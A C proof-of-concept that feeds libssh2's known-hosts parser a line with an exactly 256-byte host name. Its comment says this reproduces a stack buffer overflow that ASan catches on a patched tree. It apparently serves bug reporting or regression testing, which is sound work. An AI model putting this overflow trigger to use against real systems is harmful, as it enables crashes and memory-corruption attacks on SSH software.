/* PoC: parse a known-hosts line whose (single) host name is exactly 256
 * bytes long.  Reproduces a stack buffer overflow in the known-hosts line
 * parser of the patched tree.  Pure parser driver: no network needed.
 *
 * Expected: ASan abort (stack-buffer-overflow) on the patched tree;
 * clean error return (no crash) on the parent revision.
 */

#include <libssh2.h>

#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    char line[512];
    size_t len;
    int rc;

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 2;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init failed\n");
        return 2;
    }

    /* host part: a single 256-byte host name, then key type and key */
    memset(line, 'a', 256);
    memcpy(line + 256,
           " ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7vnf", 43);
    len = 256 + 43;

    rc = libssh2_knownhost_readline(hosts, line, len,
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    printf("libssh2_knownhost_readline returned %d\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();

    return 0;
}
